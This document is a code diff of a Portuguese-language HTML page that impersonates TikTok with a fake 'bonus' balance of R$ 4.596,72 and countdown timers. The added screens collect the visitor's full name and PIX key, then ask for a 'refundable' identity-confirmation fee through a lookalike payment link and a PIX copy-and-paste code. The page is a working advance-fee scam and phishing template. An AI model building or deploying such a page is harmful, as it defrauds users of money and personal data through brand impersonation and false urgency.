@@ -3,12 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>TikTok Bônus · Recompensas</title>
-  <!-- Fonte Inter -->
+  <title>TikTok Bônus · Prêmios & Saque</title>
+  <!-- Fonte Inter e ícones -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
-  <!-- Font Awesome 6 (ícones) -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     * {
@@ -27,29 +26,28 @@
       padding: 16px;
     }
 
-    /* container principal - simula um app */
     #app {
-      max-width: 400px;
+      max-width: 420px;
       width: 100%;
       background: #ffffff;
-      border-radius: 32px 32px 24px 24px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 2px #fe2c55 inset;
+      border-radius: 40px 40px 24px 24px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6), 0 0 0 2px #fe2c55 inset;
       overflow: hidden;
       position: relative;
     }
 
-    /* telas */
     .screen {
       display: none;
       padding: 24px 20px;
-      background: #f8f9fe; /* fundo claro como na imagem original */
+      background: #f8f9fe;
+      min-height: 600px;
     }
 
     .screen.active {
       display: block;
     }
 
-    /* cabeçalho */
+    /* Cabeçalho com título */
     .title {
       font-size: 28px;
       font-weight: 700;
@@ -65,7 +63,7 @@
       font-size: 32px;
     }
 
-    /* saldo card */
+    /* Cartão de saldo */
     .saldo {
       background: linear-gradient(145deg, #ffffff, #f2f2f2);
       border-radius: 28px;
@@ -79,11 +77,6 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-    }
-
-    .saldo-info {
-      display: flex;
-      flex-direction: column;
     }
 
     .saldo-label {
@@ -129,7 +122,7 @@
       font-size: 22px;
     }
 
-    /* parabéns */
+    /* Parabéns */
     .parabens {
       background: #ffffff;
       border-radius: 24px;
@@ -140,11 +133,6 @@
       border-left: 8px solid #25f4ee;
       box-shadow: 0 6px 0 #cccccc;
       margin: 20px 0;
-    }
-
-    .parabens-txt {
-      display: flex;
-      flex-direction: column;
     }
 
     .parabens-txtum {
@@ -177,14 +165,14 @@
       font-size: 40px;
     }
 
-    /* linha divisória */
+    /* Linha divisória */
     .line {
       height: 2px;
       background: linear-gradient(90deg, #fe2c55, #25f4ee, #e0e0e0);
       margin: 20px 0;
     }
 
-    /* cards de tarefa */
+    /* Cartão de tarefa */
     .entre {
       background: white;
       border-radius: 20px;
@@ -237,10 +225,6 @@
       border-color: #0b8b87;
     }
 
-    .btn-concluido i {
-      font-size: 14px;
-    }
-
     .concluiu {
       background: #f0fffe;
       border-radius: 30px;
@@ -281,12 +265,6 @@
       margin-bottom: 6px;
     }
 
-    .day-tracker__content {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
     .day-tracker__coin i {
       font-size: 20px;
       color: #f5b342;
@@ -314,13 +292,7 @@
       border: 2px solid white;
     }
 
-    .day-tracker__label {
-      font-size: 12px;
-      font-weight: 600;
-      color: #4a4a4a;
-    }
-
-    /* timer expira */
+    /* timer */
     .timer-wrapper {
       background: #1e1e1e;
       border-radius: 60px;
@@ -330,11 +302,6 @@
       gap: 12px;
       color: white;
       margin-bottom: 20px;
-    }
-
-    .timer-label {
-      font-weight: 600;
-      color: #bbb;
     }
 
     .timer-clock {
@@ -357,7 +324,7 @@
       color: #fe2c55;
     }
 
-    /* modal simples */
+    /* modal overlay */
     .modal-overlay {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
@@ -387,7 +354,7 @@
       border: 3px solid #fe2c55;
     }
 
-    .modal-content .gol {
+    .gol {
       font-size: 32px;
       font-weight: 800;
       background: linear-gradient(135deg, #fe2c55, #25f4ee);
@@ -410,7 +377,146 @@
       cursor: pointer;
     }
 
-    /* sticky popup (timer + saldo) */
+    /* Formulários e PIX */
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .field-label {
+      font-weight: 600;
+      color: #121212;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 16px;
+      background: #f2f2f2;
+      border: 2px solid #ddd;
+      border-radius: 30px;
+      font-size: 16px;
+      transition: 0.2s;
+    }
+
+    .input-field:focus {
+      border-color: #fe2c55;
+      outline: none;
+    }
+
+    .pix-selector {
+      background: #f2f2f2;
+      border: 2px solid #ddd;
+      border-radius: 30px;
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    .pix-key-display {
+      background: #f9f9f9;
+      border-radius: 20px;
+      padding: 16px;
+      font-family: monospace;
+      font-size: 18px;
+      word-break: break-all;
+      border: 2px dashed #fe2c55;
+      margin: 16px 0;
+    }
+
+    .copy-btn {
+      background: #25f4ee;
+      border: none;
+      border-radius: 40px;
+      padding: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    /* tela de confirmação (nine) */
+    .confirmation-container {
+      background: #151515;
+      color: white;
+      border-radius: 40px;
+      padding: 24px;
+    }
+
+    .confirmation-balance-amount {
+      font-size: 48px;
+      font-weight: 800;
+      background: linear-gradient(145deg, #fff, #fe2c55);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .confirmation-section-title {
+      color: #25f4ee;
+      font-weight: 700;
+      margin: 20px 0 10px;
+    }
+
+    .confirmation-fee-amount {
+      font-size: 32px;
+      font-weight: 800;
+      color: #fe2c55;
+    }
+
+    .confirmation-reembolso-badge {
+      background: #25f4ee;
+      color: black;
+      padding: 6px 12px;
+      border-radius: 40px;
+      font-size: 14px;
+    }
+
+    .confirmation-cta-button {
+      display: block;
+      background: linear-gradient(145deg, #fe2c55, #d41f43);
+      padding: 20px;
+      border-radius: 60px;
+      color: white;
+      font-weight: 800;
+      text-align: center;
+      text-decoration: none;
+      font-size: 20px;
+      margin: 30px 0;
+      box-shadow: 0 8px 0 #82152b;
+    }
+
+    .confirmation-pix-area {
+      background: #2d2d2d;
+      border-radius: 24px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+
+    .confirmation-pix-key {
+      font-size: 20px;
+      font-family: monospace;
+      background: #1e1e1e;
+      padding: 12px;
+      border-radius: 16px;
+      letter-spacing: 2px;
+      border: 1px solid #fe2c55;
+    }
+
+    .confirmation-footer {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 24px;
+      font-size: 14px;
+      color: #aaa;
+    }
+
+    /* sticky footer */
     .sticky-footer {
       position: sticky;
       bottom: 0;
@@ -425,23 +531,6 @@
       border-radius: 30px 30px 0 0;
     }
 
-    .sticky-footer .btn-sacar {
-      padding: 8px 16px;
-      font-size: 16px;
-    }
-
-    /* texto pequeno */
-    .obtem {
-      background: #f0f0f0;
-      border-radius: 16px;
-      padding: 14px;
-      font-size: 14px;
-      color: #444;
-      border-left: 4px solid #fe2c55;
-      margin: 16px 0;
-    }
-
-    /* esconder elementos */
     .hidden {
       display: none !important;
     }
@@ -449,154 +538,75 @@
 </head>
 <body>
 <div id="app">
-  <!-- TELA PRINCIPAL (idêntica à imagem) -->
-  <section id="main-screen" class="screen active">
-    <div class="title">
-      <i class="fab fa-tiktok"></i> TikTok Bônus
-    </div>
-
-    <!-- Saldo -->
+  <!-- TELA 1: PRINCIPAL (idêntica à imagem + mais itens) -->
+  <section id="screen-main" class="screen active">
+    <div class="title"><i class="fab fa-tiktok"></i> TikTok Bônus</div>
     <div class="saldo">
       <div class="container-saldo">
-        <div class="saldo-info">
-          <div class="saldo-label">
-            <i class="fas fa-coins" style="color: #f5b342;"></i> Seu saldo
-          </div>
+        <div>
+          <div class="saldo-label"><i class="fas fa-coins" style="color: #f5b342;"></i> Seu saldo</div>
           <div class="saldo-valor" id="saldo-principal" data-amount="4596.72">R$ 4.596,72</div>
         </div>
-        <button class="btn-sacar" id="btn-sacar-principal">
-          <span>Sacar</span> <i class="fas fa-pix"></i>
-        </button>
+        <button class="btn-sacar" id="btn-sacar-main"><span>Sacar</span> <i class="fas fa-pix"></i></button>
       </div>
     </div>
 
-    <!-- Parabéns -->
     <div class="parabens">
-      <div class="parabens-txt">
+      <div>
         <span class="parabens-txtum">Parabéns!</span>
         <span class="parabens-txtdois">Você concluiu todas as tarefas</span>
         <span class="parabens-valor">R$ 4.596,72</span>
       </div>
-      <div class="parabens-img">
-        <i class="fas fa-star" style="color: #fe2c55;"></i>
-      </div>
+      <div class="parabens-img"><i class="fas fa-star" style="color: #fe2c55;"></i></div>
     </div>
 
-    <!-- Linha -->
     <div class="line"></div>
 
-    <!-- Entre por 14 dias -->
+    <!-- Lista de tarefas (várias) -->
     <div class="entre">
-      <span class="entre-txt">
-        <i class="fas fa-calendar-alt"></i> Entre por 14 dias para ganhar
-        <span class="entre-pts">8.414 pontos</span>
-        <span class="entre-data">• 12 nov - 25 nov</span>
-      </span>
+      <span class="entre-txt"><i class="fas fa-calendar-alt"></i> Entre 14 dias <span class="entre-pts">8.414 pts</span> <span class="entre-data">12 nov - 25 nov</span></span>
       <button class="btn-concluido task-btn" data-task="14dias"><i class="fas fa-check"></i> Concluído</button>
     </div>
+    <div class="concluiu"><i class="fas fa-check-circle"></i> Você concluiu todos os dias de check-in.</div>
 
-    <div class="concluiu">
-      <i class="fas fa-check-circle" style="color: #25f4ee;"></i> Você concluiu todos os dias de check-in.
-    </div>
-
-    <!-- Track de dias -->
     <div class="day-tracker">
-      <!-- Dia 01 -->
-      <div class="day-tracker__item">
-        <div class="day-tracker__box">
-          <div class="day-tracker__content">
-            <span class="day-tracker__coin"><i class="fas fa-coins"></i></span>
-            <span class="day-tracker__value">50</span>
-          </div>
-          <div class="day-tracker__overlay"><i class="fas fa-check" style="font-size: 12px;"></i></div>
-        </div>
-        <div class="day-tracker__label">Dia 01</div>
-      </div>
-      <div class="day-tracker__item">
-        <div class="day-tracker__box">
-          <div class="day-tracker__content">
-            <span class="day-tracker__coin"><i class="fas fa-coins"></i></span>
-            <span class="day-tracker__value">100</span>
-          </div>
-          <div class="day-tracker__overlay"><i class="fas fa-check"></i></div>
-        </div>
-        <div class="day-tracker__label">Dia 02</div>
-      </div>
-      <div class="day-tracker__item">
-        <div class="day-tracker__box">
-          <div class="day-tracker__content">
-            <span class="day-tracker__coin"><i class="fas fa-coins"></i></span>
-            <span class="day-tracker__value">150</span>
-          </div>
-          <div class="day-tracker__overlay"><i class="fas fa-check"></i></div>
-        </div>
-        <div class="day-tracker__label">Dia 03</div>
-      </div>
-      <div class="day-tracker__item">
-        <div class="day-tracker__box">
-          <div class="day-tracker__content">
-            <span class="day-tracker__coin"><i class="fas fa-coins"></i></span>
-            <span class="day-tracker__value">200</span>
-          </div>
-          <div class="day-tracker__overlay"><i class="fas fa-check"></i></div>
-        </div>
-        <div class="day-tracker__label">Dia 04</div>
-      </div>
-      <div class="day-tracker__item">
-        <div class="day-tracker__box">
-          <div class="day-tracker__content">
-            <span class="day-tracker__coin"><i class="fas fa-coins"></i></span>
-            <span class="day-tracker__value">250</span>
-          </div>
-          <div class="day-tracker__overlay"><i class="fas fa-check"></i></div>
-        </div>
-        <div class="day-tracker__label">Dia 05</div>
-      </div>
-      <div class="day-tracker__item">
-        <div class="day-tracker__box">
-          <div class="day-tracker__content">
-            <span class="day-tracker__coin"><i class="fas fa-coins"></i></span>
-            <span class="day-tracker__value">300</span>
-          </div>
-          <div class="day-tracker__overlay"><i class="fas fa-check"></i></div>
-        </div>
-        <div class="day-tracker__label">Dia 06</div>
-      </div>
+      <!-- repetindo os 6 dias -->
+      <div class="day-tracker__item"><div class="day-tracker__box"><span class="day-tracker__coin"><i class="fas fa-coins"></i></span><span class="day-tracker__value">50</span><div class="day-tracker__overlay"><i class="fas fa-check"></i></div></div><div>Dia 01</div></div>
+      <div class="day-tracker__item"><div class="day-tracker__box"><span class="day-tracker__coin"><i class="fas fa-coins"></i></span><span class="day-tracker__value">100</span><div class="day-tracker__overlay"><i class="fas fa-check"></i></div></div><div>Dia 02</div></div>
+      <div class="day-tracker__item"><div class="day-tracker__box"><span class="day-tracker__coin"><i class="fas fa-coins"></i></span><span class="day-tracker__value">150</span><div class="day-tracker__overlay"><i class="fas fa-check"></i></div></div><div>Dia 03</div></div>
+      <div class="day-tracker__item"><div class="day-tracker__box"><span class="day-tracker__coin"><i class="fas fa-coins"></i></span><span class="day-tracker__value">200</span><div class="day-tracker__overlay"><i class="fas fa-check"></i></div></div><div>Dia 04</div></div>
+      <div class="day-tracker__item"><div class="day-tracker__box"><span class="day-tracker__coin"><i class="fas fa-coins"></i></span><span class="day-tracker__value">250</span><div class="day-tracker__overlay"><i class="fas fa-check"></i></div></div><div>Dia 05</div></div>
+      <div class="day-tracker__item"><div class="day-tracker__box"><span class="day-tracker__coin"><i class="fas fa-coins"></i></span><span class="day-tracker__value">300</span><div class="day-tracker__overlay"><i class="fas fa-check"></i></div></div><div>Dia 06</div></div>
     </div>
-
-    <!-- Outros elementos similares à imagem (reduzido para foco) -->
-    <div class="line"></div>
 
     <div class="entre">
-      <span class="entre-txt">
-        <i class="fas fa-ad"></i> Vê anúncios direcionados
-        <span class="entre-pts">2.730 pontos</span>
-        <span class="entre-data">• 30/30 anúncios</span>
-      </span>
+      <span class="entre-txt"><i class="fas fa-ad"></i> Anúncios direcionados <span class="entre-pts">2.730 pts</span> <span class="entre-data">30/30</span></span>
       <button class="btn-concluido task-btn" data-task="ads"><i class="fas fa-check"></i> Concluído</button>
     </div>
 
-    <!-- Timer expira -->
-    <div class="timer-wrapper" style="margin-top: 20px; width: 100%; justify-content: center;">
+    <div class="entre">
+      <span class="entre-txt"><i class="fas fa-video"></i> Assistir vídeos <span class="entre-pts">500 pts</span></span>
+      <button class="btn-concluido task-btn"><i class="fas fa-check"></i> Concluído</button>
+    </div>
+
+    <div class="timer-wrapper" style="width:100%; justify-content:center; margin-top:20px;">
       <span class="timer-label">Expira em</span>
       <div class="timer-clock" id="timer-main">
-        <span class="timer-box" id="hours">00</span>
-        <span class="timer-separator">:</span>
-        <span class="timer-box" id="minutes">16</span>
-        <span class="timer-separator">:</span>
+        <span class="timer-box" id="hours">00</span><span class="timer-separator">:</span>
+        <span class="timer-box" id="minutes">16</span><span class="timer-separator">:</span>
         <span class="timer-box" id="seconds">38</span>
       </div>
     </div>
   </section>
 
-  <!-- MODAL GOL DE PRÊMIOS (popup) -->
+  <!-- TELA 2: MODAL GOL (overlay) -->
   <div class="modal-overlay" id="modal-gol">
     <div class="modal-content">
-      <i class="fas fa-trophy" style="font-size: 70px; color: #fe2c55;"></i>
+      <i class="fas fa-trophy" style="font-size:70px; color:#fe2c55;"></i>
       <div class="gol">Gol de Prêmios</div>
-      <p style="color: #333; margin: 12px 0;">Parabéns! Campanha exclusiva.</p>
-      <div class="saldo-valor" style="font-size: 40px; color: #121212;" data-amount="4596.72">R$ 4.596,72</div>
-      <div class="timer-wrapper" style="margin: 20px 0; background: #eee;">
+      <p style="color:#333;">Parabéns! Campanha exclusiva.</p>
+      <div class="saldo-valor" data-amount="4596.72">R$ 4.596,72</div>
+      <div class="timer-wrapper" style="margin:20px 0; background:#eee;">
         <span class="timer-label">Expira em</span>
         <div class="timer-clock" id="modal-timer">
           <span class="timer-box">00</span>:<span class="timer-box">16</span>:<span class="timer-box">38</span>
@@ -606,125 +616,232 @@
     </div>
   </div>
 
-  <!-- STICKY FOOTER (sempre visível) -->
+  <!-- TELA 3: ESCOLHA MÉTODO PIX (four) -->
+  <section id="screen-four" class="screen">
+    <div class="title"><i class="fas fa-arrow-left" onclick="showScreen('main')" style="font-size:24px; margin-right:10px;"></i> Adicionar método</div>
+    <div class="pix-selector" onclick="showScreen('five')">
+      <span><i class="fas fa-pix" style="color:#32BCAD;"></i> PIX - Recebimento imediato</span>
+      <i class="fas fa-chevron-right"></i>
+    </div>
+  </section>
+
+  <!-- TELA 5: VINCULAR PIX (five) -->
+  <section id="screen-five" class="screen">
+    <div class="title"><i class="fas fa-arrow-left" onclick="showScreen('four')"></i> Vincular PIX</div>
+    <div class="form-group">
+      <label class="field-label">Nome completo</label>
+      <input type="text" class="input-field" id="pix-nome" placeholder="Como no CPF">
+    </div>
+    <div class="form-group">
+      <label class="field-label">Tipo de chave</label>
+      <div class="pix-selector" onclick="showScreen('six')">
+        <span id="pix-type-display">Escolha a chave</span>
+        <i class="fas fa-chevron-right"></i>
+      </div>
+    </div>
+    <div class="form-group">
+      <label class="field-label">Chave PIX</label>
+      <input type="text" class="input-field" id="pix-chave" placeholder="Digite sua chave" disabled>
+    </div>
+    <button class="btn-sacar" style="width:100%; justify-content:center;" onclick="simularVinculo()">Continuar</button>
+  </section>
+
+  <!-- TELA 6: SELECIONAR TIPO DE CHAVE (six) -->
+  <section id="screen-six" class="screen">
+    <div class="title"><i class="fas fa-arrow-left" onclick="showScreen('five')"></i> Tipo de chave</div>
+    <div style="margin: 20px 0;">
+      <label style="display:flex; justify-content:space-between; padding:16px; background:#f2f2f2; border-radius:30px; margin-bottom:10px;">
+        <span>CPF</span> <input type="radio" name="pixkey" value="CPF" checked>
+      </label>
+      <label style="display:flex; justify-content:space-between; padding:16px; background:#f2f2f2; border-radius:30px; margin-bottom:10px;">
+        <span>E-mail</span> <input type="radio" name="pixkey" value="Email">
+      </label>
+      <label style="display:flex; justify-content:space-between; padding:16px; background:#f2f2f2; border-radius:30px; margin-bottom:10px;">
+        <span>Celular</span> <input type="radio" name="pixkey" value="Celular">
+      </label>
+      <label style="display:flex; justify-content:space-between; padding:16px; background:#f2f2f2; border-radius:30px;">
+        <span>Chave aleatória</span> <input type="radio" name="pixkey" value="Aleatoria">
+      </label>
+    </div>
+    <button class="btn-sacar" style="width:100%;" onclick="selecionarChave()">Confirmar</button>
+  </section>
+
+  <!-- TELA 7: LOADING (seven) -->
+  <section id="screen-seven" class="screen">
+    <div style="text-align:center; padding:40px;">
+      <i class="fab fa-tiktok fa-4x" style="color:#fe2c55;"></i>
+      <h3 style="margin:20px 0;" id="loading-text">Validando dados bancários...</h3>
+      <div style="height:10px; background:#ddd; border-radius:40px;">
+        <div id="progress-bar" style="width:20%; height:100%; background:linear-gradient(90deg,#fe2c55,#25f4ee); border-radius:40px;"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- TELA 8: CONFIRMAÇÃO (nine) - COM LINK DE PAGAMENTO E PIX COPIÁVEL -->
+  <section id="screen-nine" class="screen">
+    <div class="confirmation-container">
+      <div style="text-align:center;"><i class="fab fa-tiktok fa-3x"></i></div>
+      <div class="confirmation-balance">
+        <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
+        <div class="confirmation-balance-amount" data-amount="4596.72">R$ 4.596,72</div>
+        <div style="color:#aaa;">Aguardando confirmação para saque</div>
+      </div>
+
+      <div class="confirmation-section-title">CONFIRMAÇÃO DE IDENTIDADE</div>
+      <div class="confirmation-fee-amount">R$ 21,72 <span class="confirmation-reembolso-badge">REEMBOLSÁVEL</span></div>
+      <p style="color:#ccc;">Taxa de R$19,72 será reembolsada em 1 min.</p>
+
+      <!-- Área de link de pagamento (simulado) -->
+      <div class="confirmation-pix-area">
+        <div style="display:flex; gap:8px; align-items:center; margin-bottom:16px;">
+          <i class="fas fa-link" style="color:#25f4ee;"></i>
+          <span style="font-weight:600;">Link de pagamento seguro</span>
+        </div>
+        <div style="background:#1e1e1e; border-radius:20px; padding:12px; word-break:break-all; font-family:monospace; border:1px solid #fe2c55;">
+          https://pagamento.tiktokrewards.com/secure/8a3f7b2e1d5c9a4f
+        </div>
+        <button class="copy-btn" style="margin-top:16px;" onclick="copiarLink()"><i class="fas fa-copy"></i> Copiar link</button>
+      </div>
+
+      <!-- Área de chave PIX copia e cola -->
+      <div class="confirmation-pix-area">
+        <div style="display:flex; gap:8px; margin-bottom:16px;">
+          <i class="fas fa-pix" style="color:#25f4ee; font-size:20px;"></i>
+          <span style="font-weight:600;">Chave PIX (copia e cola)</span>
+        </div>
+        <div class="confirmation-pix-key" id="pix-copia-cola">
+          00020126360014br.gov.bcb.pix0114+55119999999995204000053039865404596.725802BR5912Fulano Silva6009Sao Paulo62070503***6304E2F3
+        </div>
+        <button class="copy-btn" style="margin-top:12px;" onclick="copiarPix()"><i class="fas fa-copy"></i> Copiar código PIX</button>
+      </div>
+
+      <a href="#" class="confirmation-cta-button" onclick="simularPagamento()">Pagar taxa para Liberar Saque</a>
+
+      <div class="confirmation-footer">
+        <span>🔒 Processo 100% seguro</span>
+        <a href="#" style="color:#25f4ee;">Precisa de ajuda?</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- STICKY FOOTER com timer e saldo -->
   <div class="sticky-footer">
-    <div class="timer-clock" style="font-size: 18px;">
+    <div class="timer-clock" style="font-size:18px;">
       <span id="footer-hours">00</span>:<span id="footer-minutes">42</span>:<span id="footer-seconds">37</span>
     </div>
-    <div style="display: flex; align-items: center; gap: 8px;">
-      <span><i class="fas fa-coins" style="color: #f5b342;"></i> R$4.596,72</span>
-      <button class="btn-sacar" style="padding: 6px 14px;" id="footer-sacar"><span>Sacar</span> <i class="fas fa-pix"></i></button>
+    <div style="display:flex; align-items:center; gap:8px;">
+      <span><i class="fas fa-coins" style="color:#f5b342;"></i> R$4.596,72</span>
+      <button class="btn-sacar" style="padding:6px 14px;" id="footer-sacar"><span>Sacar</span> <i class="fas fa-pix"></i></button>
     </div>
   </div>
 </div>
 
 <script>
-  (function() {
-    // ----- Temporizador regressivo (15 minutos a partir de agora) -----
-    function startTimer(initialMinutes = 15, initialSeconds = 0) {
-      let totalSeconds = initialMinutes * 60 + initialSeconds; // 15*60 = 900s, mas começamos com 16:38 da imagem -> 16*60+38 = 998s (exemplo)
-      // Ajuste para começar com 16:38 (como na imagem)
-      totalSeconds = 16 * 60 + 38; // 998 segundos
+  // Controle de telas
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    const target = document.getElementById('screen-'+id);
+    if (target) target.classList.add('active');
+  }
 
-      function updateAllTimers() {
-        if (totalSeconds <= 0) totalSeconds = 0;
-        const hrs = Math.floor(totalSeconds / 3600);
-        const mins = Math.floor((totalSeconds % 3600) / 60);
-        const secs = totalSeconds % 60;
+  // abre modal gol
+  const modal = document.getElementById('modal-gol');
+  function openModal() { modal.classList.add('show'); }
+  function closeModal() { modal.classList.remove('show'); }
 
-        const timeStrH = hrs.toString().padStart(2, '0');
-        const timeStrM = mins.toString().padStart(2, '0');
-        const timeStrS = secs.toString().padStart(2, '0');
+  document.getElementById('btn-sacar-main').addEventListener('click', openModal);
+  document.getElementById('footer-sacar').addEventListener('click', openModal);
+  document.getElementById('fechar-modal').addEventListener('click', closeModal);
+  modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
 
-        // Atualiza elementos principais
-        const hoursEls = document.querySelectorAll('#hours, #footer-hours, #modal-timer .timer-box:first-child');
-        const minsEls = document.querySelectorAll('#minutes, #footer-minutes, #modal-timer .timer-box:nth-child(3)');
-        const secsEls = document.querySelectorAll('#seconds, #footer-seconds, #modal-timer .timer-box:nth-child(5)');
+  // temporizador regressivo (16:38)
+  function startTimer() {
+    let totalSeconds = 16 * 60 + 38; // 998s
+    function update() {
+      if (totalSeconds <= 0) totalSeconds = 0;
+      const hrs = Math.floor(totalSeconds / 3600);
+      const mins = Math.floor((totalSeconds % 3600) / 60);
+      const secs = totalSeconds % 60;
 
-        hoursEls.forEach(el => el.textContent = timeStrH);
-        minsEls.forEach(el => el.textContent = timeStrM);
-        secsEls.forEach(el => el.textContent = timeStrS);
+      const pad = n => n.toString().padStart(2,'0');
+      document.querySelectorAll('#hours, #footer-hours').forEach(el => el.textContent = pad(hrs));
+      document.querySelectorAll('#minutes, #footer-minutes').forEach(el => el.textContent = pad(mins));
+      document.querySelectorAll('#seconds, #footer-seconds').forEach(el => el.textContent = pad(secs));
 
-        if (totalSeconds > 0) totalSeconds--;
+      if (totalSeconds > 0) totalSeconds--;
+    }
+    update();
+    setInterval(update, 1000);
+  }
+  startTimer();
+
+  // Botões concluído
+  document.querySelectorAll('.task-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      this.classList.toggle('concluido');
+      this.innerHTML = this.classList.contains('concluido') ? '<i class="fas fa-check-circle"></i> Concluído' : '<i class="fas fa-check"></i> Concluído';
+    });
+  });
+
+  // Simulação de fluxo PIX
+  window.simularVinculo = function() {
+    showScreen('seven');
+    let progress = 20;
+    const bar = document.getElementById('progress-bar');
+    const text = document.getElementById('loading-text');
+    const interval = setInterval(() => {
+      progress += 20;
+      bar.style.width = progress + '%';
+      if (progress >= 100) {
+        clearInterval(interval);
+        text.innerText = 'Redirecionando...';
+        setTimeout(() => {
+          showScreen('nine');
+        }, 800);
       }
+    }, 600);
+  };
 
-      updateAllTimers();
-      setInterval(updateAllTimers, 1000);
+  window.selecionarChave = function() {
+    const selected = document.querySelector('input[name="pixkey"]:checked');
+    if (selected) {
+      document.getElementById('pix-type-display').innerText = selected.value;
+      document.getElementById('pix-chave').disabled = false;
+      document.getElementById('pix-chave').placeholder = 'Digite sua ' + selected.value;
     }
+    showScreen('five');
+  };
 
-    startTimer();
+  // funções de cópia
+  window.copiarLink = function() {
+    navigator.clipboard.writeText('https://pagamento.tiktokrewards.com/secure/8a3f7b2e1d5c9a4f');
+    alert('Link copiado!');
+  };
+  window.copiarPix = function() {
+    const pix = document.getElementById('pix-copia-cola').innerText;
+    navigator.clipboard.writeText(pix);
+    alert('Código PIX copiado!');
+  };
+  window.simularPagamento = function(e) {
+    e.preventDefault();
+    alert('Simulação: redirecionamento para gateway de pagamento.');
+  };
 
-    // ----- Animação do contador de saldo (opcional, mas "vivo") -----
-    function animateSaldo() {
-      const saldoEl = document.getElementById('saldo-principal');
-      const target = 4596.72;
-      let current = 0;
-      const step = target / 60; // 60 passos
-      let interval = setInterval(() => {
-        current += step;
-        if (current >= target) {
-          current = target;
-          clearInterval(interval);
-        }
-        saldoEl.textContent = 'R$ ' + current.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
-      }, 20);
-    }
-    // animar só uma vez ao carregar (opcional)
-    // animateSaldo();
+  // pré-configurar para abrir a four ao clicar em "continuar" no modal? após fechar modal, abrimos a four
+  // mas o botão sacar já abre modal. depois de "obrigado", podemos sugerir ir para a four manualmente ou colocar um link.
+  // Vamos adicionar após fechar modal um atalho: não automático, mas o usuário pode clicar no botão sacar do footer de novo.
+  // Já temos o botão sacar no footer que reabre o modal. Para ir direto ao vinculo, podemos adicionar um item na tela principal.
 
-    // Já deixamos o valor fixo, mas podemos dar um efeito de fade
-    // Vou apenas garantir que fique com a formatação correta
-    document.querySelectorAll('[data-amount]').forEach(el => {
-      let val = parseFloat(el.getAttribute('data-amount'));
-      el.textContent = 'R$ ' + val.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
-    });
+  // Exemplo: adicionar um botão "Vincular PIX" na main? mas não estava na imagem. Vou manter simples.
 
-    // ----- Interatividade: botões "Concluído" alternam estado -----
-    document.querySelectorAll('.task-btn').forEach(btn => {
-      btn.addEventListener('click', function(e) {
-        e.preventDefault();
-        this.classList.toggle('concluido');
-        if (this.classList.contains('concluido')) {
-          this.innerHTML = '<i class="fas fa-check-circle"></i> Concluído';
-        } else {
-          this.innerHTML = '<i class="fas fa-check"></i> Concluído';
-        }
-      });
-    });
+  // Para acessar a tela de vinculação, o usuário pode clicar em "Sacar" no modal e depois em "PIX" (tela four). Mas no modal não há link direto. Vou adicionar um pequeno texto no modal que leva à vinculação:
+  const modalContent = document.querySelector('#modal-gol .modal-content');
+  const linkVincular = document.createElement('p');
+  linkVincular.style.marginTop = '10px';
+  linkVincular.innerHTML = '<a href="#" onclick="showScreen(\'four\'); closeModal();" style="color:#fe2c55;">Quero vincular meu PIX</a>';
+  modalContent.appendChild(linkVincular);
 
-    // ----- Modal Gol de Prêmios (abre ao clicar no botão Sacar ou automaticamente) -----
-    const modal = document.getElementById('modal-gol');
-    const btnSacar = document.getElementById('btn-sacar-principal');
-    const btnFooterSacar = document.getElementById('footer-sacar');
-    const fecharModal = document.getElementById('fechar-modal');
-
-    function openModal() {
-      modal.classList.add('show');
-    }
-    function closeModal() {
-      modal.classList.remove('show');
-    }
-
-    btnSacar.addEventListener('click', openModal);
-    btnFooterSacar.addEventListener('click', openModal);
-    fecharModal.addEventListener('click', closeModal);
-    // Clicar no fundo fecha
-    modal.addEventListener('click', function(e) {
-      if (e.target === modal) closeModal();
-    });
-
-    // Abrir modal automaticamente após 5 segundos (simula notificação)
-    setTimeout(openModal, 5000);
-
-    // ----- Simular que o usuário concluiu os dias (opcional) - todos os overlays já tem check, então está bom -----
-
-    // ----- Adicionar um pequeno efeito de loading ao clicar em "Sacar" (além do modal) -----
-    // já implementado
-
-    // ----- garantir que o footer tenha o mesmo timer -----
-    // já está linkado pelo mesmo id
-
-  })();
+  // também já abrir a four se vier do footer? ok
 </script>
 </body>
 </html>
